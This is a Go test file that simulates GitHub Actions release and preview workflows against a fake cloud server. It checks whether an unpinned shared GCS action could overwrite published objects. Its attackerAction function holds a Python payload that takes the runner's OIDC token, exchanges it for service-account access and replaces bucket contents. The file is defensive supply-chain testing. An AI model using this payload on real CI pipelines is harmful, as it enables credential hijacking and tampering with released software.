package ghwf_test

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"testing"

	"gopkg.in/yaml.v3"
)

// These tests exercise the release and preview upload workflows at the commit
// under test. An unpinned grafana/shared-workflows GCS action is executed as
// whatever commit that action's branch currently names. The runner injects the
// job OIDC request variables into every script step of a job whose id-token
// permission is write, and the action then exchanges that token the way
// google-github-actions/auth does. The published object must still be the
// legitimate package afterwards.

const (
	legitimateObject = "legitimate-package\n"
	objectName       = "published-object"
	requestToken     = "oidc-request-placeholder"
	wifAudience      = "https://iam.googleapis.com/projects/304398677251/locations/global/workloadIdentityPools/github/providers/github-provider"
	stsAudience      = "//iam.googleapis.com/projects/304398677251/locations/global/workloadIdentityPools/github/providers/github-provider"
	cloudScope       = "https://www.googleapis.com/auth/cloud-platform"
)

func TestUnpinnedSharedWorkflowActionsDoNotReplacePublishedObjects(t *testing.T) {
	repo := moduleRoot(t)
	cases := []struct {
		name     string
		workflow string
		event    event
	}{
		{
			name:     "release push to main",
			workflow: "release-build.yml",
			event:    pushEvent("grafana/grafana", "main"),
		},
		{
			name:     "release weeknight schedule",
			workflow: "release-build.yml",
			event:    scheduleEvent("grafana/grafana"),
		},
		{
			name:     "release dispatch on main",
			workflow: "release-build.yml",
			event:    dispatchEvent("grafana/grafana", "main"),
		},
		{
			name:     "release security mirror",
			workflow: "release-build.yml",
			event:    pushEvent("grafana/grafana-security-mirror", "release-13.0.0#patched"),
		},
		{
			name:     "storybook push to main",
			workflow: "deploy-storybook.yml",
			event:    pushEvent("grafana/grafana", "main"),
		},
		{
			name:     "storybook release call",
			workflow: "deploy-storybook.yml",
			event:    workflowCallEvent("grafana/grafana", "v13.3.0"),
		},
		{
			name:     "storybook pull request preview",
			workflow: "deploy-storybook-preview.yml",
			event:    pullRequestEvent("grafana/grafana", "feature-branch", 42, []string{"packages/grafana-ui/src/Theme.tsx"}),
		},
		{
			name:     "frontend preview comment",
			workflow: "deploy-frontend-preview.yml",
			event:    frontendPreviewComment("grafana/grafana", 42),
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			snap := runWorkflow(t, repo, tc.workflow, tc.event)
			for bucket, objects := range snap.after {
				before := snap.before[bucket]
				if len(objects) != len(before) {
					t.Fatalf("job %s replaced objects in bucket %s: before %d after %d (%v)", snap.jobs, bucket, len(before), len(objects), objectKeys(objects))
				}
				for name, got := range objects {
					want, ok := before[name]
					if !ok || !bytes.Equal(got, want) {
						t.Fatalf("unpinned action replaced gs://%s/%s during %s (jobs %s): got %q", bucket, name, tc.name, snap.jobs, got)
					}
				}
			}
			t.Logf("jobs %s uploads %v", snap.jobs, snap.uploads)
		})
	}
}

func TestSHAPinnedActionDoesNotReplacePublishedObjects(t *testing.T) {
	root := t.TempDir()
	workflowDir := filepath.Join(root, ".github", "workflows")
	if err := os.MkdirAll(workflowDir, 0o755); err != nil {
		t.Fatal(err)
	}
	const pinned = "0123456789abcdef0123456789abcdef01234567"
	body := fmt.Sprintf(`
name: pinned upload
on:
  push:
    branches: [main]
permissions: {}
jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
    steps:
      - uses: grafana/shared-workflows/actions/push-to-gcs@%s
        with:
          bucket: pinned-bucket
          environment: prod
          path: out
          bucket_path: releases
          service_account: writer@example.iam.gserviceaccount.com
`, pinned)
	if err := os.WriteFile(filepath.Join(workflowDir, "pinned.yml"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	snap := runWorkflow(t, root, "pinned.yml", pushEvent("grafana/grafana", "main"))
	got := snap.after["pinned-bucket"][objectName]
	if !bytes.Equal(got, []byte(legitimateObject)) {
		t.Fatalf("sha-pinned action wrote %q", got)
	}
}

func TestExprMatchesWorkflowConditions(t *testing.T) {
	ctx := &evalCtx{github: map[string]any{
		"repository": "grafana/grafana",
		"ref_name":   "main",
		"event_name": "push",
	}}
	if !truthy(mustEval(t, "github.repository == 'grafana/grafana' && github.ref_name == 'main'", ctx)) {
		t.Fatal("main push condition")
	}
	ctx.github["ref_name"] = "feature"
	if truthy(mustEval(t, "(github.repository == 'grafana/grafana' && github.ref_name == 'main') || (github.repository == 'grafana/grafana-security-mirror' && endsWith(github.ref_name, '#patched'))", ctx)) {
		t.Fatal("feature branch matched release setup")
	}
	ctx.github["repository"] = "grafana/grafana-security-mirror"
	ctx.github["ref_name"] = "release-13.0.0#patched"
	if !truthy(mustEval(t, "endsWith(github.ref_name, '#patched')", ctx)) {
		t.Fatal("patched ref")
	}
	ctx.steps = map[string]map[string]string{}
	got := mustEval(t, "steps.changed-files.outputs.frontend_packages_any_modified || 'true'", ctx)
	if got.s != "true" {
		t.Fatalf("skipped changed-files output: %#v", got)
	}
}

type event struct {
	Name          string
	Repository    string
	RefName       string
	DefaultBranch string
	Inputs        map[string]string
	Paths         []string
	Github        map[string]any
}

func pushEvent(repo, ref string) event {
	return event{Name: "push", Repository: repo, RefName: ref, DefaultBranch: "main", Github: map[string]any{
		"repository": repo, "ref_name": ref, "event_name": "push", "run_id": "1001", "sha": "79b51878149c7325f7efcd069c126daab22483ae",
	}}
}

func scheduleEvent(repo string) event {
	ev := pushEvent(repo, "main")
	ev.Name = "schedule"
	ev.Github["event_name"] = "schedule"
	return ev
}

func dispatchEvent(repo, ref string) event {
	ev := pushEvent(repo, ref)
	ev.Name = "workflow_dispatch"
	ev.Github["event_name"] = "workflow_dispatch"
	return ev
}

func workflowCallEvent(repo, version string) event {
	ev := pushEvent(repo, "main")
	ev.Name = "workflow_call"
	ev.Github["event_name"] = "workflow_call"
	ev.Inputs = map[string]string{"version": version}
	return ev
}

func pullRequestEvent(repo, branch string, number int, paths []string) event {
	ev := pushEvent(repo, branch)
	ev.Name = "pull_request"
	ev.Paths = paths
	ev.Github["event_name"] = "pull_request"
	ev.Github["event"] = map[string]any{
		"pull_request": map[string]any{
			"number": number,
			"head": map[string]any{
				"ref": branch,
				"repo": map[string]any{
					"fork":      false,
					"full_name": repo,
				},
			},
		},
	}
	return ev
}

func frontendPreviewComment(repo string, number int) event {
	ev := pushEvent(repo, "main")
	ev.Name = "issue_comment"
	ev.Github["event_name"] = "issue_comment"
	ev.Github["event"] = map[string]any{
		"issue": map[string]any{
			"number":       number,
			"pull_request": true,
		},
		"comment": map[string]any{
			"body":               "/deploy-to-fs",
			"author_association": "MEMBER",
			"id":                 "1",
		},
	}
	return ev
}

type snapshot struct {
	before  map[string]map[string][]byte
	after   map[string]map[string][]byte
	jobs    string
	uploads []string
}

type cloud struct {
	mu        sync.Mutex
	objects   map[string]map[string][]byte
	originals map[string]map[string][]byte
	sas       map[string]struct{}
	buckets   map[string]struct{}
}

func newCloud() *cloud {
	return &cloud{
		objects:   map[string]map[string][]byte{},
		originals: map[string]map[string][]byte{},
		sas:       map[string]struct{}{},
		buckets:   map[string]struct{}{},
	}
}

func (c *cloud) seed(bucket string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.buckets[bucket] = struct{}{}
	if c.objects[bucket] == nil {
		c.objects[bucket] = map[string][]byte{}
	}
	if _, ok := c.objects[bucket][objectName]; !ok {
		c.objects[bucket][objectName] = []byte(legitimateObject)
	}
	if c.originals[bucket] == nil {
		c.originals[bucket] = map[string][]byte{objectName: []byte(legitimateObject)}
	}
}

func (c *cloud) allow(sa, bucket string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if sa != "" {
		c.sas[sa] = struct{}{}
	}
	if bucket != "" {
		c.buckets[bucket] = struct{}{}
	}
}

func (c *cloud) clone() map[string]map[string][]byte {
	c.mu.Lock()
	defer c.mu.Unlock()
	out := map[string]map[string][]byte{}
	for bucket, objects := range c.objects {
		out[bucket] = map[string][]byte{}
		for name, body := range objects {
			out[bucket][name] = append([]byte(nil), body...)
		}
	}
	return out
}

func runWorkflow(t *testing.T, repo, workflow string, ev event) snapshot {
	t.Helper()
	doc := readYAML(t, filepath.Join(repo, ".github", "workflows", workflow))
	if !triggered(doc["on"], ev) {
		t.Fatalf("event %s does not trigger %s; the test scenario is not a run of this workflow", ev.Name, workflow)
	}
	store := newCloud()
	srv := httptest.NewServer(cloudHandler(store))
	t.Cleanup(srv.Close)
	bin := writeFakes(t)
	ctx := &evalCtx{
		github: ev.Github,
		needs:  map[string]map[string]string{},
		inputs: ev.Inputs,
		env:    map[string]string{},
		steps:  map[string]map[string]string{},
	}
	if ctx.inputs == nil {
		ctx.inputs = map[string]string{}
	}
	var ran []string
	jobs := asMap(doc["jobs"])
	order := topo(t, jobs)
	executed := map[string]string{}
	for _, id := range order {
		job := asMap(jobs[id])
		status, uploads := runJob(t, repo, doc, id, job, ev, ctx, store, srv.URL, bin)
		executed[id] = status
		ran = append(ran, uploads...)
		if status == "success" {
			ctx.needs[id] = jobOutputs(job, ctx)
		}
	}
	return snapshot{before: storeBefore(store), after: store.clone(), jobs: fmt.Sprint(executed), uploads: ran}
}

// storeBefore is filled by seed before steps. The cloud records the original
// bytes in originals so a later overwrite is visible.
func storeBefore(c *cloud) map[string]map[string][]byte {
	c.mu.Lock()
	defer c.mu.Unlock()
	return cloneObjects(c.originals)
}

func cloneObjects(in map[string]map[string][]byte) map[string]map[string][]byte {
	out := map[string]map[string][]byte{}
	for bucket, objects := range in {
		out[bucket] = map[string][]byte{}
		for name, body := range objects {
			out[bucket][name] = append([]byte(nil), body...)
		}
	}
	return out
}

func runJob(t *testing.T, repo string, workflow map[string]any, id string, job map[string]any, ev event, ctx *evalCtx, store *cloud, base, bin string) (string, []string) {
	t.Helper()
	if !jobRunnable(t, id, job, ctx) {
		return "skipped", nil
	}
	if uses, ok := asString(job["uses"]); ok {
		if strings.Contains(uses, "publish-artifact.yml") {
			return runReusable(t, repo, workflow, id, job, uses, ev, ctx, store, base, bin)
		}
		return "success", nil
	}
	if heavy(job) {
		return "success", nil
	}
	return executeSteps(t, repo, id, job, workflowPerms(workflow, job), ev, ctx, store, base, bin)
}

func runReusable(t *testing.T, repo string, callerDoc map[string]any, id string, job map[string]any, uses string, ev event, ctx *evalCtx, store *cloud, base, bin string) (string, []string) {
	t.Helper()
	name := workflowFile(uses)
	called := readYAML(t, filepath.Join(repo, ".github", "workflows", name))
	inputs := workflowInputs(called, evalStringMap(asMap(job["with"]), ctx))
	callerToken := workflowPerms(callerDoc, job)
	var uploads []string
	for _, calledID := range topo(t, asMap(called["jobs"])) {
		calledJob := asMap(asMap(called["jobs"])[calledID])
		child := &evalCtx{
			github: ctx.github,
			needs:  map[string]map[string]string{},
			inputs: inputs,
			env:    map[string]string{},
			steps:  map[string]map[string]string{},
		}
		perms := intersectIDToken(callerToken, calledJob["permissions"])
		status, ups := executeSteps(t, repo, id+"/"+calledID, calledJob, perms, ev, child, store, base, bin)
		uploads = append(uploads, ups...)
		if status == "failure" {
			return "failure", uploads
		}
	}
	return "success", uploads
}

func executeSteps(t *testing.T, repo, jobID string, job map[string]any, idToken bool, ev event, ctx *evalCtx, store *cloud, base, bin string) (string, []string) {
	t.Helper()
	steps, _ := job["steps"].([]any)
	if len(steps) == 0 {
		return "success", nil
	}
	ws := t.TempDir()
	seedWorkspace(t, repo, ws)
	ctx.env = evalStringMap(asMap(job["env"]), ctx)
	ctx.env["GITHUB_REPOSITORY"] = fmt.Sprint(ctx.github["repository"])
	ctx.env["GITHUB_REF_NAME"] = fmt.Sprint(ctx.github["ref_name"])
	ctx.env["GITHUB_RUN_ID"] = fmt.Sprint(ctx.github["run_id"])
	ctx.env["GITHUB_EVENT_NAME"] = fmt.Sprint(ctx.github["event_name"])
	buckets, accounts := scanTargets(steps, ctx)
	for _, bucket := range buckets {
		store.seed(bucket)
		for _, sa := range accounts {
			store.allow(sa, bucket)
		}
		if len(accounts) == 0 {
			store.allow("", bucket)
		}
	}
	actionDir := writeAttackerAction(t, base, buckets, accounts)
	var uploads []string
	for i, raw := range steps {
		step := asMap(raw)
		stepCtx := *ctx
		stepCtx.env = mergeEnv(ctx.env, evalStringMap(asMap(step["env"]), ctx))
		outFile := filepath.Join(ws, fmt.Sprintf("step-output-%d", i))
		stepCtx.env["GITHUB_OUTPUT"] = outFile
		if cond, ok := asString(step["if"]); ok {
			if !truthy(evalExpr(stripOuter(cond), &stepCtx)) {
				continue
			}
		}
		stepID, _ := asString(step["id"])
		if uses, ok := asString(step["uses"]); ok {
			outs, ran := runUses(t, repo, uses, evalStringMap(asMap(step["with"]), &stepCtx), idToken, &stepCtx, ws, bin, actionDir, base)
			if stepID != "" {
				ctx.steps[stepID] = outs
			}
			if ran {
				uploads = append(uploads, jobID+":"+uses)
			}
			continue
		}
		script, ok := asString(step["run"])
		if !ok {
			continue
		}
		// The runner evaluates ${{ }} in a run script before the shell sees it.
		script = evalTemplate(script, &stepCtx)
		if err := runBash(t, ws, bin, script, stepCtx.env, idToken, base); err != nil {
			t.Logf("step %s run failed: %v", stepID, err)
			return "failure", uploads
		}
		if stepID != "" {
			ctx.steps[stepID] = readOutput(outFile)
		}
	}
	return "success", uploads
}

func runUses(t *testing.T, repo, uses string, with map[string]string, idToken bool, ctx *evalCtx, ws, bin, attacker, base string) (map[string]string, bool) {
	t.Helper()
	if isLocal(uses) {
		if !allowLocal(uses) {
			return map[string]string{}, false
		}
		return runLocalAction(t, repo, uses, with, idToken, ctx, ws, bin, base), false
	}
	_, ref, path := splitUses(uses)
	if !unpinnedGCS(path, ref) {
		return map[string]string{}, false
	}
	// A branch ref is resolved when the job runs. The action directory is the
	// commit that ref names. A full SHA is not replaced.
	action := readYAML(t, filepath.Join(attacker, filepath.Base(path), "action.yml"))
	runComposite(t, action, with, idToken, ctx, ws, bin, base)
	return map[string]string{}, true
}

func runLocalAction(t *testing.T, repo, uses string, with map[string]string, idToken bool, ctx *evalCtx, ws, bin, base string) map[string]string {
	t.Helper()
	dir := filepath.Join(repo, strings.TrimPrefix(uses, "./"))
	action := readYAML(t, filepath.Join(dir, "action.yml"))
	saved := ctx.inputs
	ctx.inputs = with
	defer func() { ctx.inputs = saved }()
	child := &evalCtx{github: ctx.github, needs: ctx.needs, inputs: with, env: ctx.env, steps: map[string]map[string]string{}}
	rawSteps, _ := actionRunsSteps(action)
	for _, raw := range rawSteps {
		step := asMap(raw)
		if cond, ok := asString(step["if"]); ok && !truthy(evalExpr(stripOuter(cond), child)) {
			continue
		}
		stepEnv := mergeEnv(child.env, evalStringMap(asMap(step["env"]), child))
		if script, ok := asString(step["run"]); ok {
			script = evalTemplate(script, child)
			outFile := filepath.Join(ws, "local-output")
			_ = os.WriteFile(outFile, nil, 0o644)
			stepEnv["GITHUB_OUTPUT"] = outFile
			if err := runBash(t, ws, bin, script, stepEnv, idToken, base); err != nil {
				t.Fatalf("local action %s: %v", uses, err)
			}
			if id, ok := asString(step["id"]); ok {
				child.steps[id] = readOutput(outFile)
			}
		}
	}
	outs := map[string]string{}
	for name, raw := range asMap(action["outputs"]) {
		spec := asMap(raw)
		value, _ := asString(spec["value"])
		outs[name] = evalTemplate(value, child)
	}
	return outs
}

func actionRunsSteps(action map[string]any) ([]any, bool) {
	runs := asMap(action["runs"])
	steps, ok := runs["steps"].([]any)
	return steps, ok
}

func runComposite(t *testing.T, action map[string]any, with map[string]string, idToken bool, parent *evalCtx, ws, bin, base string) {
	t.Helper()
	child := &evalCtx{github: parent.github, needs: parent.needs, inputs: with, env: parent.env, steps: map[string]map[string]string{}}
	rawSteps, _ := actionRunsSteps(action)
	for _, raw := range rawSteps {
		step := asMap(raw)
		if cond, ok := asString(step["if"]); ok && !truthy(evalExpr(stripOuter(cond), child)) {
			continue
		}
		env := mergeEnv(child.env, evalStringMap(asMap(step["env"]), child))
		script, _ := asString(step["run"])
		if script == "" {
			continue
		}
		script = evalTemplate(script, child)
		if err := runBash(t, ws, bin, script, env, idToken, base); err != nil {
			t.Fatalf("attacker action: %v", err)
		}
	}
}

func runBash(t *testing.T, ws, bin, script string, env map[string]string, idToken bool, base string) error {
	t.Helper()
	out := filepath.Join(ws, "step-output")
	if existing := env["GITHUB_OUTPUT"]; existing != "" {
		out = existing
	}
	cmd := exec.Command("bash", "-c", script)
	cmd.Dir = ws
	cmd.Env = os.Environ()
	cmd.Env = append(cmd.Env, "PATH="+bin+":"+os.Getenv("PATH"))
	cmd.Env = append(cmd.Env, "GITHUB_OUTPUT="+out)
	cmd.Env = append(cmd.Env, "GITHUB_WORKSPACE="+ws)
	for k, v := range env {
		cmd.Env = append(cmd.Env, k+"="+v)
	}
	if idToken {
		// ScriptHandler copies GenerateIdTokenUrl into every script step when
		// the job connection carries it. id-token: write is what makes the
		// Actions service put that URL on the job.
		endpoint := base
		if endpoint == "" {
			endpoint = env["__OIDC_BASE__"]
		}
		if endpoint != "" {
			cmd.Env = append(cmd.Env,
				"ACTIONS_ID_TOKEN_REQUEST_URL="+endpoint+"/oidc/token?dummy=1",
				"ACTIONS_ID_TOKEN_REQUEST_TOKEN="+requestToken,
			)
		}
	}
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	cmd.Stdout = &stderr
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("%w: %s", err, stderr.String())
	}
	return nil
}

func writeAttackerAction(t *testing.T, base string, buckets, accounts []string) string {
	t.Helper()
	dir := t.TempDir()
	body := attackerAction(base, buckets, accounts)
	for _, name := range []string{"login-to-gcs", "push-to-gcs"} {
		path := filepath.Join(dir, name)
		if err := os.MkdirAll(path, 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(path, "action.yml"), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

func attackerAction(base string, buckets, accounts []string) string {
	encBuckets, _ := json.Marshal(buckets)
	encAccounts, _ := json.Marshal(accounts)
	return fmt.Sprintf(`
name: unpinned replacement
runs:
  using: composite
  steps:
    - shell: bash
      env:
        SERVICE_ACCOUNT: ${{ inputs.service_account }}
        BUCKET: ${{ inputs.bucket }}
      run: |
        python3 - <<'PY'
        import json, os, urllib.parse, urllib.request
        base = %q
        token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
        url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
        if not token or not url:
            raise SystemExit(0)
        aud = %q
        req = urllib.request.Request(url + "&audience=" + urllib.parse.quote(aud, safe=""), headers={"Authorization": "bearer " + token})
        with urllib.request.urlopen(req) as resp:
            oidc = json.load(resp)["value"]
        sts = {
            "audience": %q,
            "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
            "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
            "scope": %q,
            "subjectTokenType": "urn:ietf:params:oauth:token-type:jwt",
            "subjectToken": oidc,
        }
        req = urllib.request.Request(base + "/sts/v1/token", data=json.dumps(sts).encode(), headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req) as resp:
            federated = json.load(resp)["access_token"]
        accounts = json.loads(%q)
        step_sa = os.environ.get("SERVICE_ACCOUNT", "")
        if step_sa:
            accounts = [step_sa]
        buckets = json.loads(%q)
        step_bucket = os.environ.get("BUCKET", "")
        if step_bucket:
            buckets = [step_bucket]
        marker = "replaced-by-unpinned-action\n"
        for sa in accounts:
            path = "/iam/v1/projects/-/serviceAccounts/" + urllib.parse.quote(sa, safe="") + ":generateAccessToken"
            body = json.dumps({"scope": [%q]}).encode()
            req = urllib.request.Request(base + path, data=body, headers={"Authorization": "Bearer " + federated, "Content-Type": "application/json"})
            with urllib.request.urlopen(req) as resp:
                access = json.load(resp)["accessToken"]
            for bucket in buckets:
                q = urllib.parse.urlencode({"name": %q, "uploadType": "multipart"})
                upload = base + "/upload/storage/v1/b/" + bucket + "/o?" + q
                req = urllib.request.Request(upload, data=marker.encode(), method="POST", headers={"Authorization": "Bearer " + access, "Content-Type": "application/octet-stream"})
                with urllib.request.urlopen(req) as resp:
                    resp.read()
        PY
`, base, wifAudience, stsAudience, cloudScope, string(encAccounts), string(encBuckets), cloudScope, objectName)
}

func cloudHandler(store *cloud) http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("/oidc/token", func(w http.ResponseWriter, r *http.Request) {
		if !strings.EqualFold(strings.TrimPrefix(r.Header.Get("Authorization"), "bearer "), requestToken) && !strings.EqualFold(strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer "), requestToken) {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		aud := r.URL.Query().Get("audience")
		if aud != wifAudience {
			http.Error(w, "audience", http.StatusForbidden)
			return
		}
		claims := map[string]any{
			"iss":        "https://token.actions.githubusercontent.com",
			"aud":        aud,
			"sub":        "repo:" + r.Header.Get("X-Test-Repository") + ":ref:refs/heads/main",
			"repository": r.Header.Get("X-Test-Repository"),
		}
		// The job token's claims are the workflow run, not the action ref.
		// claims_supported from token.actions.githubusercontent.com has no action id.
		payload, _ := json.Marshal(claims)
		token := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none"}`)) + "." + base64.RawURLEncoding.EncodeToString(payload) + ".sig"
		_ = json.NewEncoder(w).Encode(map[string]string{"value": token})
	})
	mux.HandleFunc("/sts/v1/token", func(w http.ResponseWriter, r *http.Request) {
		var body map[string]string
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		if body["audience"] != stsAudience || body["grantType"] != "urn:ietf:params:oauth:grant-type:token-exchange" || body["subjectTokenType"] != "urn:ietf:params:oauth:token-type:jwt" || body["scope"] != cloudScope {
			http.Error(w, "exchange", http.StatusForbidden)
			return
		}
		payload := decodeJWTPayload(body["subjectToken"])
		if payload["aud"] != wifAudience || !strings.HasPrefix(fmt.Sprint(payload["sub"]), "repo:") {
			http.Error(w, "subject", http.StatusForbidden)
			return
		}
		if _, ok := payload["action_ref"]; ok {
			http.Error(w, "action bound", http.StatusForbidden)
			return
		}
		_ = json.NewEncoder(w).Encode(map[string]string{"access_token": "federated-token-placeholder"})
	})
	mux.HandleFunc("/iam/v1/projects/-/serviceAccounts/", func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer federated-token-placeholder" {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		sa := strings.TrimPrefix(r.URL.Path, "/iam/v1/projects/-/serviceAccounts/")
		sa = strings.TrimSuffix(sa, ":generateAccessToken")
		sa, _ = url.PathUnescape(sa)
		store.mu.Lock()
		_, ok := store.sas[sa]
		store.mu.Unlock()
		if !ok {
			http.Error(w, "sa", http.StatusForbidden)
			return
		}
		_ = json.NewEncoder(w).Encode(map[string]string{"accessToken": "access-token-placeholder"})
	})
	mux.HandleFunc("/upload/storage/v1/b/", func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer access-token-placeholder" {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		rest := strings.TrimPrefix(r.URL.Path, "/upload/storage/v1/b/")
		bucket, _, _ := strings.Cut(rest, "/")
		store.mu.Lock()
		_, ok := store.buckets[bucket]
		store.mu.Unlock()
		if !ok {
			http.Error(w, "bucket", http.StatusForbidden)
			return
		}
		body, _ := io.ReadAll(r.Body)
		name := r.URL.Query().Get("name")
		if name == "" {
			name = objectName
		}
		store.mu.Lock()
		if store.objects[bucket] == nil {
			store.objects[bucket] = map[string][]byte{}
		}
		store.objects[bucket][name] = body
		store.mu.Unlock()
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"name":"` + name + `"}`))
	})
	return mux
}

func decodeJWTPayload(token string) map[string]any {
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return map[string]any{}
	}
	raw, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return map[string]any{}
	}
	var payload map[string]any
	if json.Unmarshal(raw, &payload) != nil {
		return map[string]any{}
	}
	return payload
}

func workflowPerms(workflow, job map[string]any) bool {
	if _, ok := job["permissions"]; ok {
		return idTokenWrite(job["permissions"])
	}
	return idTokenWrite(workflow["permissions"])
}

func intersectIDToken(caller bool, called any) bool {
	if !caller {
		return false
	}
	if called == nil {
		return true
	}
	return idTokenWrite(called)
}

func idTokenWrite(v any) bool {
	m := asMap(v)
	got, ok := m["id-token"]
	return ok && fmt.Sprint(got) == "write"
}

func workflowInputs(called map[string]any, with map[string]string) map[string]string {
	out := map[string]string{}
	on := asMap(called["on"])
	call := asMap(on["workflow_call"])
	for name, raw := range asMap(call["inputs"]) {
		spec := asMap(raw)
		if def, ok := spec["default"]; ok {
			out[name] = fmt.Sprint(def)
		}
	}
	for k, v := range with {
		out[k] = v
	}
	return out
}

func scanTargets(steps []any, ctx *evalCtx) (buckets, accounts []string) {
	seenB := map[string]struct{}{}
	seenA := map[string]struct{}{}
	add := func(dst *[]string, seen map[string]struct{}, v string) {
		v = strings.TrimSpace(v)
		if v == "" {
			return
		}
		if _, ok := seen[v]; ok {
			return
		}
		seen[v] = struct{}{}
		*dst = append(*dst, v)
	}
	for k, v := range ctx.env {
		if strings.Contains(strings.ToLower(k), "bucket") {
			add(&buckets, seenB, v)
		}
	}
	for _, raw := range steps {
		step := asMap(raw)
		with := evalStringMap(asMap(step["with"]), ctx)
		add(&buckets, seenB, with["bucket"])
		add(&accounts, seenA, with["service_account"])
	}
	return buckets, accounts
}

func jobRunnable(t *testing.T, id string, job map[string]any, ctx *evalCtx) bool {
	t.Helper()
	_ = id
	needs := needIDs(job["needs"])
	cond, hasIf := asString(job["if"])
	expr := stripOuter(cond)
	// A skipped dependency skips this job unless its if uses a status function
	// that continues after failure. !cancelled() is that function for the
	// storybook deploy job.
	continues := strings.Contains(expr, "always()") || strings.Contains(expr, "cancelled()") || strings.Contains(expr, "failure()")
	if !continues {
		for _, need := range needs {
			if _, ok := ctx.needs[need]; !ok {
				return false
			}
		}
	}
	if !hasIf {
		return true
	}
	return truthy(evalExpr(expr, ctx))
}

func jobOutputs(job map[string]any, ctx *evalCtx) map[string]string {
	out := map[string]string{}
	for name, raw := range asMap(job["outputs"]) {
		expr, _ := asString(raw)
		out[name] = evalTemplate(expr, ctx)
	}
	return out
}

func heavy(job map[string]any) bool {
	if uses, ok := asString(job["uses"]); ok && !strings.Contains(uses, "publish-artifact.yml") {
		return true
	}
	steps, _ := job["steps"].([]any)
	for _, raw := range steps {
		step := asMap(raw)
		run, _ := asString(step["run"])
		if strings.Contains(run, "yarn install") || strings.Contains(run, "yarn build") || strings.Contains(run, "make ") {
			return true
		}
		uses, _ := asString(step["uses"])
		for _, frag := range []string{"build-frontend", "build-go", "build-targz", "setup-fpm", "build-docker"} {
			if strings.Contains(uses, frag) {
				return true
			}
		}
	}
	return false
}

func triggered(on any, ev event) bool {
	switch v := on.(type) {
	case string:
		return v == ev.Name
	case []any:
		for _, item := range v {
			if fmt.Sprint(item) == ev.Name {
				return true
			}
		}
		return false
	case map[string]any:
		spec, ok := v[ev.Name]
		if !ok {
			return false
		}
		if ev.Name == "schedule" {
			return ev.RefName == ev.DefaultBranch || ev.RefName == "" || ev.RefName == "main"
		}
		if ev.Name == "workflow_dispatch" || ev.Name == "workflow_call" || ev.Name == "issue_comment" {
			return true
		}
		block := asMap(spec)
		if ev.Name == "push" {
			if !branchOK(block, ev.RefName) {
				return false
			}
		}
		if paths, ok := block["paths"].([]any); ok && len(ev.Paths) > 0 {
			return pathsMatch(paths, ev.Paths)
		}
		return true
	default:
		return false
	}
}

func branchOK(block map[string]any, ref string) bool {
	raw, ok := block["branches"].([]any)
	if !ok {
		return true
	}
	for _, item := range raw {
		if matchGlob(fmt.Sprint(item), ref) {
			return true
		}
	}
	return false
}

func pathsMatch(patterns []any, paths []string) bool {
	for _, path := range paths {
		for _, pattern := range patterns {
			if matchPath(fmt.Sprint(pattern), path) {
				return true
			}
		}
	}
	return false
}

func matchGlob(pattern, name string) bool {
	var b strings.Builder
	b.WriteString("^")
	for _, r := range pattern {
		switch r {
		case '*':
			b.WriteString("[^/]*")
		case '.', '+', '(', ')', '|', '?', '^', '$', '[', ']', '{', '}', '\\':
			b.WriteByte('\\')
			b.WriteRune(r)
		default:
			b.WriteRune(r)
		}
	}
	b.WriteString("$")
	re, err := regexp.Compile(b.String())
	return err == nil && re.MatchString(name)
}

func matchPath(pattern, path string) bool {
	pattern = strings.TrimSuffix(pattern, "/")
	if strings.HasSuffix(pattern, "/**") {
		prefix := strings.TrimSuffix(pattern, "/**")
		return path == prefix || strings.HasPrefix(path, prefix+"/")
	}
	return matchGlob(pattern, path)
}

func seedWorkspace(t *testing.T, repo, ws string) {
	t.Helper()
	copyFile(t, filepath.Join(repo, "package.json"), filepath.Join(ws, "package.json"))
	mustDir(t, filepath.Join(ws, "artifact", "package"))
	if err := os.WriteFile(filepath.Join(ws, "artifact", "package", "grafana.tar.gz"), []byte(legitimateObject), 0o644); err != nil {
		t.Fatal(err)
	}
	mustDir(t, filepath.Join(ws, "public", "build"))
	mustDir(t, filepath.Join(ws, "public", "fonts"))
	if err := os.WriteFile(filepath.Join(ws, "public", "build", "assets-manifest.json"), []byte("{}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(ws, "public", "fonts", "font.woff"), []byte("font"), 0o644); err != nil {
		t.Fatal(err)
	}
	mustDir(t, filepath.Join(ws, "packages", "grafana-ui", "dist", "storybook"))
	if err := os.WriteFile(filepath.Join(ws, "packages", "grafana-ui", "dist", "storybook", "index.html"), []byte("storybook"), 0o644); err != nil {
		t.Fatal(err)
	}
}

func writeFakes(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
